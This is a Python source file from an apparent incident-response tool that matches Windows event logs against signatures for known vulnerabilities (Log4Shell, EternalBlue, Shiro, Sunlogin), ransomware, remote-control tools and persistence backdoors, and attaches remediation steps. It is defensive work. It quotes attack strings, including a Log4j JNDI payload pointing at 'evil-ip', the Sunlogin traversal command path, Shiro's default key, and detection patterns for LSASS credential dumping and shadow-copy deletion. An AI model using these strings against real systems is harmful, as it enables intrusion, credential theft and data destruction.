"""
AI 攻击载荷 (POC/EXP) 提取、CVE/CNVD 漏洞智能匹配、勒索/远控识别与持久化后门核查清单服务
(services/vuln_matcher.py)
"""

import base64
import re
from datetime import datetime, timedelta
from typing import Any, Optional

from database import Case, CaseHost, HostArtifact, IOCIntelligence


# ==============================================================================
# 1. 内置高危漏洞特征与 POC 载荷匹配知识库
# ==============================================================================
VULN_SIGNATURE_RULES: list[dict[str, Any]] = [
    {
        "rule_id": "weaver_oa_rce",
        "cve_id": "CNVD-2023-12632 / QVD-2023-5012",
        "vuln_name": "泛微 E-Cology OA 前台远程代码执行漏洞",
        "component": "泛微 E-Cology OA (Weaver Resin / BeanShell / FileUpload)",
        "cvss_score": 9.8,
        "severity": "critical",
        "pattern": re.compile(
            r"(weaver|ecology|bsh\.servlet\.BshServlet|ChangeUserInfo|ofsLogin|weaver\.common|w3wp\.exe.*ecology)",
            re.I,
        ),
        "principle": (
            "攻击者利用泛微 E-Cology OA 未授权接口（如 BeanShell 组件或 ChangeUserInfo/XmlRpcServlet 接口）"
            "绕过身份认证直接上传 JSP/ASPX Webshell 内存马或执行任意系统指令。"
        ),
        "remediation": (
            "1. 立即升级泛微 E-Cology 官方安全补丁包（v10.58+）；\n"
            "2. 在 WAF 侧临时封堵 `/weaver/bsh.servlet.BshServlet`、`/mobile/plugin/ChangeUserInfo.jsp` 等高危 URI；\n"
            "3. 排查 `/weaver/ecology/` 目录下近期新增的 `.jsp` 脚本及 Resin/Tomcat 内存马。"
        ),
    },
    {
        "rule_id": "log4j2_jndi_rce",
        "cve_id": "CVE-2021-44228 / CNVD-2021-95914",
        "vuln_name": "Apache Log4j2 JNDI 远程代码执行漏洞 (Log4Shell)",
        "component": "Apache Log4j2 (2.0-beta9 ~ 2.14.1) / SpringBoot & Tomcat 容器",
        "cvss_score": 10.0,
        "severity": "critical",
        "pattern": re.compile(
            r"(\$\{jndi:(ldap|rmi|dns|ldaps|iiop):\/\/|Log4j|JndiLookup|tomcat.*powershell.*-enc|java\.exe.*jndi)",
            re.I,
        ),
        "principle": (
            "Log4j2 在处理日志字符串时存在 Recursive Lookup 缺陷，攻击者在 HTTP 请求头或表单参数中注入 "
            "`${jndi:ldap://evil-ip:1389/Exploit}` 载荷，诱导服务器通过 LDAP/RMI 远程加载恶意字节码并派生 Shell。"
        ),
        "remediation": (
            "1. 将 `log4j-core` 升级至安全版本 `2.17.1` 及以上；\n"
            "2. 临时缓解：添加 JVM 启动参数 `-Dlog4j2.formatMsgNoLookups=true` 或删除 `org/apache/logging/log4j/core/lookup/JndiLookup.class`；\n"
            "3. 封禁服务器主动向公网发起的异常 `1389/1099` 端口 LDAP/RMI 外联请求。"
        ),
    },
    {
        "rule_id": "sunlogin_rce",
        "cve_id": "CNVD-2022-10270 / CNVD-2022-03672",
        "vuln_name": "向日葵个人版/企业版远程代码执行漏洞 (Sunlogin RCE)",
        "component": "Oray 向日葵客户端 (SunloginClient.exe < v12.5.1)",
        "cvss_score": 9.8,
        "severity": "critical",
        "pattern": re.compile(
            r"(SunloginClient\.exe|\/cgi-bin\/rpc|check\?cmd=ping|aweray|sunlogin.*cmd\.exe|sunlogin.*powershell)",
            re.I,
        ),
        "principle": (
            "向日葵客户端在本地开启高端口（通常为 40000~65535）HTTP 服务，攻击者在内网通过访问 `/cgi-bin/rpc?action=verify-haras` "
            "获取 CID Token 后，调用 `/check?cmd=ping..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe` 以 SYSTEM 权限执行任意命令。"
        ),
        "remediation": (
            "1. 立即卸载非授权安装的向日葵 (`SunloginClient.exe`)、ToDesk 等个人远控软件，统一走企业堡垒机运维；\n"
            "2. 若业务确需使用，必须升级至最新版客户端并开启高强度独立访问密码与主机防火墙源 IP 限制。"
        ),
    },
    {
        "rule_id": "ms17_010_eternalblue",
        "cve_id": "CVE-2017-0144 / MS17-010",
        "vuln_name": "Windows SMBv1 远程内核代码执行漏洞 (永恒之蓝 EternalBlue)",
        "component": "Windows Server SMBv1 协议栈 (srv.sys / 445端口)",
        "cvss_score": 9.8,
        "severity": "critical",
        "pattern": re.compile(
            r"(ms17-010|eternalblue|doublepulsar|cve-2017-0144|spoolsv\.exe.*cmd\.exe|lsass\.exe.*cmd\.exe)",
            re.I,
        ),
        "principle": (
            "Windows SMBv1 服务在处理特制 `FEA (File Extended Attributes)` 转换列表时存在内核缓冲区溢出，"
            "攻击者可无需认证通过 445 端口植入 DoublePulsar 后门并在内网高速横向感染。"
        ),
        "remediation": (
            "1. 安装微软官方安全更新补丁（如 KB4012212 / KB4012215）；\n"
            "2. 立即通过 PowerShell 禁用 SMBv1 协议：`Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`；\n"
            "3. 在主机防火墙及交换机 ACL 封禁跨网段 445 端口。"
        ),
    },
    {
        "rule_id": "shiro_deserialization",
        "cve_id": "CVE-2016-4437 / CNVD-2016-07814",
        "vuln_name": "Apache Shiro RememberMe 反序列化远程代码执行漏洞",
        "component": "Apache Shiro (< 1.2.5) / Java Web 中间件",
        "cvss_score": 9.8,
        "severity": "critical",
        "pattern": re.compile(
            r"(rememberMe=|CommonsBeanutils|CommonsCollections|shiro|kPH\+bIxk5D2deZiIxcaaaA==)",
            re.I,
        ),
        "principle": (
            "Apache Shiro 默认使用硬编码的 AES 密钥 (`kPH+bIxk5D2deZiIxcaaaA==`) 对 Cookie 中的 `rememberMe` 字段进行加解密与 Java 反序列化，"
            "攻击者可构造恶意 Gadget 链直接执行任意命令或注入冰蝎/哥斯拉内存马。"
        ),
        "remediation": (
            "1. 升级 Apache Shiro 至 1.7.0+ 并更换随机生成的强 AES CipherKey；\n"
            "2. 在 WAF 侧拦截 Cookie 中长度异常或包含反序列化特征的 `rememberMe` 请求。"
        ),
    },
    {
        "rule_id": "lsass_credential_dump_pth",
        "cve_id": "CVE-2020-1472 (Zerologon) / ATT&CK T1003.001",
        "vuln_name": "LSASS 内存凭据转储与内网 Pass-the-Hash 横向接管域控",
        "component": "Windows LSASS 认证子系统 / Active Directory Netlogon",
        "cvss_score": 9.6,
        "severity": "critical",
        "pattern": re.compile(
            r"(sekurlsa|lsadump|mimikatz|procdump.*lsass|comsvcs\.dll.*MiniDump|ntds\.dit|privilege::debug|pth\b)",
            re.I,
        ),
        "principle": (
            "攻击者获取单机管理员权限后，利用 `procdump.exe`、`comsvcs.dll MiniDump` 或 `Mimikatz` 读取 `lsass.exe` 进程内存，"
            "提取域管理员 NTLM Hash 或明文凭据，进而通过 Pass-the-Hash (哈希传递) 或 DCSync 横向夺取 AD 域控权限。"
        ),
        "remediation": (
            "1. 开启 LSASS 受保护进程模式 (RunAsPPL)：`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f`；\n"
            "2. 禁用 WDigest 明文密码缓存，立即重置失陷域管账户及 `krbtgt` 账户密码（连续重置 2 次）。"
        ),
    },
    {
        "rule_id": "synaptics_worm_infection",
        "cve_id": "MALWARE-WORM / ATT&CK T1547.001 & T1036.005",
        "vuln_name": "Win32.Worm.Synaptics (\"怪兽\" / ._cache_ PE 文件感染型蠕虫木马)",
        "component": "C:\\ProgramData\\Synaptics\\Synaptics.exe & 第三方破解工具 (xf-adsk / PatchXTRACT / DXF2XTRACT)",
        "cvss_score": 9.3,
        "severity": "critical",
        "pattern": re.compile(
            r"(programdata\\synaptics\\synaptics\.exe|\._cache_.*?\b|RunKey:怪兽)",
            re.I,
        ),
        "principle": (
            "该主机通过企业微信/U盘接收并运行了被感染的工程软件注册机/破解补丁（`xf-adsk2018_x64.exe`、`PatchXTRACTv308.exe`、`DXF2XTRACT.exe`）。"
            "被 `Win32.Worm.Synaptics` (厂商伪造为“怪兽”) 感染的 `.exe` 在执行时，会将原始正常程序释放为同目录下的隐藏文件 `._cache_<原文件名>.exe` 并拉起，"
            "同时在 `C:\\ProgramData\\Synaptics\\Synaptics.exe` 释放隐藏蠕虫母体（MD5: `727C12E23C6BA1A9AC360EFD675E2B93`），"
            "并写入注册表 `HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run` 键（名称：`怪兽`）实现开机自启与全盘 `.exe` 感染。"
        ),
        "remediation": (
            "1. 立即终止蠕虫进程：`taskkill /F /IM Synaptics.exe /T`；\n"
            "2. 删除注册表自启动项：`reg delete \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"怪兽\" /f`；\n"
            "3. 清除蠕虫母体文件：`attrib -h -s -r \"C:\\ProgramData\\Synaptics\\Synaptics.exe\" & del /f /q \"C:\\ProgramData\\Synaptics\\Synaptics.exe\"`；\n"
            "4. 恢复被感染的业务程序：在桌面 `Xtract`、`C:\\Program Files (x86)\\TRC\\XTRACT` 及企业微信接收目录中，将被感染的外壳 `.exe` 删除，并将隐藏的 `._cache_<原文件名>.exe` 取消隐藏后重命名回原文件名！"
        ),
    },
]


def extract_and_match_cves(
    artifacts: list[HostArtifact],
    hosts: list[CaseHost],
) -> list[dict[str, Any]]:
    """
    从案件的高危事件 (4688/7045 等) 中提取原始攻击 POC/EXP 载荷片段，并智能匹配 CVE/CNVD 漏洞详情
    """
    host_map = {h.id: h.hostname for h in hosts}
    matched_list: list[dict[str, Any]] = []
    seen_rule_keys: set[str] = set()

    for art in artifacts:
        if art.risk_level not in ("critical", "high"):
            continue
        pdata = art.parsed_data or {}
        cmd_line = str(pdata.get("CommandLine") or "").strip()
        img_path = str(pdata.get("ImagePath") or "").strip()
        proc_name = str(pdata.get("NewProcessName") or "").strip()
        parent_name = str(pdata.get("ParentProcessName") or "").strip()
        decoded_payload = str(pdata.get("DecodedPayload") or "").strip()
        poc_request = str(pdata.get("ExploitPOC") or "").strip()

        combined_text = f"{proc_name} {parent_name} {cmd_line} {img_path} {decoded_payload} {poc_request} {art.summary or ''}"
        hostname = host_map.get(art.host_id, f"Host-{art.host_id}")
        t_str = art.event_time.strftime("%Y-%m-%d %H:%M:%S UTC") if art.event_time else "N/A"

        # 提取最具代表性的原始 POC 载荷片段
        raw_poc = poc_request or cmd_line or img_path or art.summary or ""
        if parent_name and cmd_line:
            parent_short = parent_name.replace("/", "\\").split("\\")[-1]
            proc_short = proc_name.replace("/", "\\").split("\\")[-1]
            if not poc_request:
                raw_poc = f"[{parent_short} -> {proc_short}] {cmd_line}"

        matched_any_rule = False
        for rule in VULN_SIGNATURE_RULES:
            if rule["pattern"].search(combined_text):
                matched_any_rule = True
                dedup_key = f"{rule['rule_id']}:{art.host_id}"
                if dedup_key in seen_rule_keys:
                    continue
                seen_rule_keys.add(dedup_key)
                matched_list.append(
                    {
                        "id": f"vuln_{rule['rule_id']}_{art.id}",
                        "cve_id": rule["cve_id"],
                        "vuln_name": rule["vuln_name"],
                        "component": rule["component"],
                        "cvss_score": rule["cvss_score"],
                        "cvss": rule["cvss_score"],
                        "severity": rule["severity"],
                        "hostname": hostname,
                        "host": hostname,
                        "event_id": art.event_id,
                        "event_time": t_str,
                        "poc_payload": raw_poc,
                        "extracted_poc": raw_poc,
                        "decoded_poc": decoded_payload,
                        "principle": rule["principle"],
                        "remediation": rule["remediation"],
                    }
                )

        # 若未命中特定命名 CVE 规则，但属于典型 Webshell 派生或 PowerShell -enc 远程加载，则生成通用漏洞/EXP卡片
        if not matched_any_rule:
            parent_short = parent_name.replace("/", "\\").split("\\")[-1].lower()
            proc_short = proc_name.replace("/", "\\").split("\\")[-1].lower()
            if parent_short in ("w3wp.exe", "tomcat.exe", "java.exe", "javaw.exe", "php-cgi.exe", "httpd.exe", "nginx.exe"):
                dedup_key = f"generic_webshell_rce:{art.host_id}"
                if dedup_key not in seen_rule_keys:
                    seen_rule_keys.add(dedup_key)
                    matched_list.append(
                        {
                            "id": f"vuln_webshell_{art.id}",
                            "cve_id": "CWE-434 / ATT&CK T1505.003",
                            "vuln_name": f"Web 中间件 ({parent_short}) 任意文件上传 / Webshell 远程命令执行",
                            "component": f"Web Server 容器 ({parent_short})",
                            "cvss_score": 9.5,
                            "cvss": 9.5,
                            "severity": "critical",
                            "hostname": hostname,
                            "host": hostname,
                            "event_id": art.event_id,
                            "event_time": t_str,
                            "poc_payload": raw_poc,
                            "extracted_poc": raw_poc,
                            "decoded_poc": decoded_payload,
                            "principle": (
                                f"Web 服务进程 `{parent_short}` 异常派生系统命令解释器 `{proc_short}`，"
                                "表明攻击者已通过文件上传漏洞、反序列化漏洞或 OA/CMS 接口注入驻留了 Webshell 木马。"
                            ),
                            "remediation": (
                                "1. 结合 Web 访问日志定位与该时间点完全吻合的 POST 请求 URI（重点排查 `.aspx/.jsp/.php`）；\n"
                                "2. 剥离网站上传目录（如 `/upload/`、`/static/`）的脚本执行权限；\n"
                                "3. 重启中间件进程池以清除潜在的 Filter/Servlet 内存马。"
                            ),
                        }
                    )
            elif decoded_payload and art.event_id in (4688, 7045):
                dedup_key = f"ps_encoded_exploit:{art.host_id}"
                if dedup_key not in seen_rule_keys:
                    seen_rule_keys.add(dedup_key)
                    matched_list.append(
                        {
                            "id": f"vuln_ps_enc_{art.id}",
                            "cve_id": "ATT&CK T1059.001 / T1027.010",
                            "vuln_name": "PowerShell Base64 混淆载荷无文件内存注入 (Fileless Exploit)",
                            "component": "Windows PowerShell / WMI / WinRM 子系统",
                            "cvss_score": 9.1,
                            "cvss": 9.1,
                            "severity": "critical",
                            "hostname": hostname,
                            "host": hostname,
                            "event_id": art.event_id,
                            "event_time": t_str,
                            "poc_payload": raw_poc,
                            "extracted_poc": raw_poc,
                            "decoded_poc": decoded_payload,
                            "principle": (
                                "攻击者利用 `-EncodedCommand (-enc)` 将恶意下载器或反射注入脚本编码为 UTF-16LE Base64 字符串，"
                                "绕过常规命令行静态关键字检测并在内存中直接拉起远控木马或矿机。"
                            ),
                            "remediation": (
                                "1. 封禁解码明文中暴露的外部 C2 URL / IP 地址；\n"
                                "2. 启用 PowerShell Constrained Language Mode (受限语言模式) 与 EventID 4104 脚本块日志审计。"
                            ),
                        }
                    )

    return matched_list


# ==============================================================================
# 2. 勒索病毒家族特征识别与第三方远控软件（向日葵/ToDesk）排查
# ==============================================================================
RANSOMWARE_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "mallox_ransomware",
        "category": "ransomware",
        "name": "Mallox (TargetCompany / 法老) 勒索病毒家族",
        "severity": "critical",
        "pattern": re.compile(r"(\.mallox\b|mallox|FILE\s+RECOVERY\s+INFORMATION\.txt|TargetCompany)", re.I),
        "decryptor_status": "⚠️ 新版 Mallox 暂无法直接枚举私钥解密；可通过 MDF 数据库碎片抢救工具或未受损备机恢复",
        "advice": (
            "1. 立即切断受感染主机的 SMB (445) 与数据库远程连接，防止横向加密其他院区/业务节点；\n"
            "2. 严禁重启或格式化磁盘！保留加密现场用于 SQL Server / Oracle MDF 底层页级数据提取恢复。"
        ),
    },
    {
        "id": "lockbit_ransomware",
        "category": "ransomware",
        "name": "LockBit 3.0 (LockBit Black) 勒索病毒家族",
        "severity": "critical",
        "pattern": re.compile(r"(\.lockbit\b|Restore-My-Files\.txt|lockbit)", re.I),
        "decryptor_status": "⚠️ 需核对勒索信 ID 是否属于国际执法行动已缴获私钥批次",
        "advice": "立即隔离受感染网段，排查域控 GPO 组策略是否被篡改用于批量下发勒索载荷。",
    },
    {
        "id": "phobos_locked_ransomware",
        "category": "ransomware",
        "name": "Phobos / .locked 勒索病毒家族",
        "severity": "critical",
        "pattern": re.compile(r"(\.phobos\b|\.locked\b|\.8base\b|\.eking\b)", re.I),
        "decryptor_status": "⚠️ 暂不具备通用公开解密器，建议优先通过离线备份与卷影残留恢复",
        "advice": "该家族常伴随 RDP 弱口令暴破投递，请立即封锁公网/内网 3389 端口并排查全网相同口令主机。",
    },
    {
        "id": "vss_shadow_deletion",
        "category": "ransomware_precursor",
        "name": "勒索加密高危动作：卷影副本 (VSS) 与系统恢复强制抹除",
        "severity": "critical",
        "pattern": re.compile(
            r"(vssadmin.*delete\s+shadows|wbadmin\s+delete\s+catalog|bcdedit.*recoveryenabled\s+no|wmic\s+shadowcopy\s+delete)",
            re.I,
        ),
        "decryptor_status": "🚨 检测到勒索病毒执行加密前的标准防恢复抹除指令！",
        "advice": (
            "攻击者正在或已经执行删除 Windows 卷影副本 (`vssadmin delete shadows /all /quiet`)，"
            "请立即检查核心数据库文件是否已被加密，并在存储层/虚拟化层冻结快照！"
        ),
    },
    {
        "id": "synaptics_worm_family",
        "category": "ransomware",
        "name": "Win32.Worm.Synaptics (\"怪兽\" / ._cache_ PE 感染型蠕虫病毒)",
        "severity": "critical",
        "pattern": re.compile(r"(programdata\\synaptics\\synaptics\.exe|\._cache_.*?\b|RunKey:怪兽)", re.I),
        "decryptor_status": "✅ 可无损恢复原程序！蠕虫将原版干净 .exe 重命名隐藏为同目录 `._cache_<原文件名>.exe`",
        "advice": (
            "先杀掉 `Synaptics.exe` (PID 13580) 并清理 `HKLM\\...\\Wow6432Node\\...\\Run\\怪兽` 启动项与 `C:\\ProgramData\\Synaptics\\Synaptics.exe` 母体，"
            "随后将桌面/工程目录下被感染的 `.exe` 删除，把隐藏的 `._cache_*.exe` 取消隐藏并改回原名即可恢复干净程序！"
        ),
    },
]

RAT_TOOL_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "sunlogin_rat",
        "category": "remote_control",
        "name": "向日葵远程控制客户端 (SunloginClient.exe)",
        "severity": "high",
        "pattern": re.compile(r"(SunloginClient\.exe|AweSun|Oray\\Sunlogin)", re.I),
        "decryptor_status": "🔍 检出第三方商业远控软件驻留 (常见跨网段跳板 & CNVD-2022-10270 RCE 高危目标)",
        "advice": (
            "核查是否为运维人员私自安装；攻击者极易利用向日葵验证码绕过或历史 RCE 漏洞直接获取 SYSTEM 权限横向渗透，"
            "建议立即停止 `SunloginService` 并卸载。"
        ),
    },
    {
        "id": "todesk_rat",
        "category": "remote_control",
        "name": "ToDesk 远程控制客户端 (ToDesk.exe)",
        "severity": "high",
        "pattern": re.compile(r"(ToDesk\.exe|ToDesk_Service\.exe)", re.I),
        "decryptor_status": "🔍 检出第三方远控软件 ToDesk 驻留 (攻击者常用隐蔽后门通道)",
        "advice": "攻击者常在失陷主机静默安装便携版 ToDesk 并窃取配置文件中的临时密码维持长久控制，建议立即终止并清理。",
    },
    {
        "id": "anydesk_rat",
        "category": "remote_control",
        "name": "AnyDesk / RustDesk 远程控制工具",
        "severity": "high",
        "pattern": re.compile(r"(AnyDesk\.exe|RustDesk\.exe|TeamViewer\.exe)", re.I),
        "decryptor_status": "🔍 检出跨境/第三方远控程序活动",
        "advice": "勒索软件团伙常植入 AnyDesk 作为备用图形化控制通道，请立即核查其连接日志 (`ad_svc.trace`) 并卸载。",
    },
]


def detect_ransomware_and_rats(
    artifacts: list[HostArtifact],
    hosts: list[CaseHost],
) -> list[dict[str, Any]]:
    """
    扫描案件伪影中的勒索病毒家族特征与向日葵/ToDesk/AnyDesk 等第三方远控软件
    """
    host_map = {h.id: h.hostname for h in hosts}
    alerts: list[dict[str, Any]] = []
    seen_ids: set[str] = set()

    for art in artifacts:
        pdata = art.parsed_data or {}
        text = " ".join(
            [
                str(pdata.get("NewProcessName") or ""),
                str(pdata.get("ParentProcessName") or ""),
                str(pdata.get("CommandLine") or ""),
                str(pdata.get("ImagePath") or ""),
                str(pdata.get("DecodedPayload") or ""),
                str(art.summary or ""),
            ]
        )
        hostname = host_map.get(art.host_id, f"Host-{art.host_id}")
        evidence = str(pdata.get("CommandLine") or pdata.get("ImagePath") or art.summary or "")[:240]

        for rule in RANSOMWARE_PATTERNS + RAT_TOOL_PATTERNS:
            if rule["pattern"].search(text):
                key = f"{rule['id']}:{art.host_id}"
                if key in seen_ids:
                    continue
                seen_ids.add(key)
                alerts.append(
                    {
                        "id": f"alert_{rule['id']}_{art.id}",
                        "category": rule["category"],
                        "type": "ransomware" if "ransomware" in rule["category"] else "rat",
                        "name": rule["name"],
                        "severity": rule["severity"],
                        "hostname": hostname,
                        "host": hostname,
                        "event_id": art.event_id,
                        "evidence": evidence,
                        "status_note": rule["decryptor_status"],
                        "advice": rule["advice"],
                        "decryptor_info": f"{rule['decryptor_status']} | 处置建议：{rule['advice']}",
                    }
                )

    return alerts


# ==============================================================================
# 3. 防复发持久化后门全量核查 Checklist 构建器
# ==============================================================================
def build_persistence_checklist(artifacts: list[HostArtifact]) -> list[dict[str, Any]]:
    """
    针对 6 大常见持久化后门维度自动汇总当前案件检出状态，供前端交互式勾选核查
    """
    shadow_hits: list[str] = []
    schtask_hits: list[str] = []
    service_hits: list[str] = []
    reg_hits: list[str] = []
    wmi_hits: list[str] = []
    webshell_rat_hits: list[str] = []

    for art in artifacts:
        if art.risk_level not in ("critical", "high", "medium"):
            continue
        pdata = art.parsed_data or {}
        cmd = str(pdata.get("CommandLine") or "")
        img = str(pdata.get("ImagePath") or "")
        proc = str(pdata.get("NewProcessName") or "")
        parent = str(pdata.get("ParentProcessName") or "")
        decoded = str(pdata.get("DecodedPayload") or "")
        combined = f"{proc} {parent} {cmd} {img} {decoded} {art.summary or ''}"

        # 1. 影子账户与特权账号
        if art.event_id == 4720 or re.search(r"net1?\s+(user|localgroup\s+administrators).*\/add", combined, re.I):
            u = pdata.get("TargetUserName") or cmd or art.summary
            shadow_hits.append(str(u)[:80])

        # 2. 计划任务持久化
        if re.search(r"(schtasks.*\/create|Register-ScheduledTask)", combined, re.I):
            schtask_hits.append((cmd or art.summary)[:90])

        # 3. 7045 异常系统服务
        if art.event_id == 7045 and art.risk_level in ("critical", "high"):
            sname = pdata.get("ServiceName") or "可疑服务"
            service_hits.append(f"{sname} ({img[:60]})")

        # 4. 注册表启动项与镜像劫持
        if re.search(r"(currentversion\\run|currentversion\\runonce|winlogon\\userinit|image\s+file\s+execution\s+options)", combined, re.I):
            reg_hits.append((cmd or art.summary)[:90])

        # 5. WMI 事件订阅后门
        if re.search(r"(__EventFilter|CommandLineEventConsumer|FilterToConsumerBinding|root\\subscription)", combined, re.I):
            wmi_hits.append((cmd or art.summary)[:90])

        # 6. Webshell / 内存马 / 第三方远控
        if re.search(r"(w3wp\.exe|tomcat\.exe|SunloginClient\.exe|ToDesk\.exe|AnyDesk\.exe|webshell|behind|godzilla)", combined, re.I):
            webshell_rat_hits.append((cmd or proc or art.summary)[:90])

    def _item(
        cid: str,
        title: str,
        category: str,
        hits: list[str],
        clean_desc: str,
        verify_cmd: str,
    ) -> dict[str, Any]:
        has_hit = len(hits) > 0
        return {
            "id": cid,
            "title": title,
            "category": category,
            "detected": has_hit,
            "status": "detected" if has_hit else "clean",
            "status_label": f"🚨 已检出异常 ({len(hits)} 项)" if has_hit else "✅ 日志未见明显异常 (建议人工复核)",
            "hit_count": len(hits),
            "detail": f"命中证据：{'; '.join(hits[:2])}" if has_hit else clean_desc,
            "verify_cmd": verify_cmd,
            "checked": False,
        }

    return [
        _item(
            "chk_shadow_account",
            "1. 影子账户与特权管理员组核查 (Event 4720 / SAM 克隆)",
            "账户权限层",
            shadow_hits,
            "当前日志未捕获 4720 新建隐藏账户事件，请复核注册表 SAM Names 键值防止 RID 劫持。",
            r'net user & net localgroup administrators & reg query "HKLM\SAM\SAM\Domains\Account\Users\Names"',
        ),
        _item(
            "chk_scheduled_task",
            "2. 高危计划任务定时拉起核查 (Scheduled Tasks)",
            "定时任务层",
            schtask_hits,
            "当前日志未捕获 schtasks /create 命令，请核查 TaskCache 注册表与 System32\\Tasks 目录。",
            r'schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run powershell cmd temp users"',
        ),
        _item(
            "chk_malicious_service",
            "3. 7045 异常系统服务与恶意驱动持久化核查",
            "系统服务层",
            service_hits,
            "当前日志未发现高危恶意系统服务注册，建议复核非微软签名服务项。",
            r'wmic service where "state=\'running\' and not pathname like \'C:\\Windows%\'" get name,pathname,startmode',
        ),
        _item(
            "chk_registry_run",
            "4. 注册表 Run 启动项、Winlogon 与 IFEO 镜像劫持核查",
            "注册表层",
            reg_hits,
            "当前日志未捕获注册表启动项篡改命令，建议巡检 HKLM/HKCU Run 键与粘滞键 sethc.exe。",
            r'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"',
        ),
        _item(
            "chk_wmi_subscription",
            "5. WMI 事件订阅无文件后门核查 (root\\subscription)",
            "无文件驻留层",
            wmi_hits,
            "当前日志未捕获 WMI 永久事件订阅指令，建议在 PowerShell 下执行 WMI 命名空间清空排查。",
            r'powershell -Command "Get-WmiObject -Namespace root\Subscription -Class __EventConsumer; Get-WmiObject -Namespace root\Subscription -Class __EventFilter"',
        ),
        _item(
            "chk_webshell_rat",
            "6. Webshell / Java 内存马与第三方远控软件 (向日葵/ToDesk) 驻留核查",
            "应用与远控层",
            webshell_rat_hits,
            "当前日志未发现 Web 容器异常派生或非授权远控软件进程。",
            r'tasklist /svc | findstr /i "Sunlogin ToDesk AnyDesk w3wp java tomcat"',
        ),
    ]
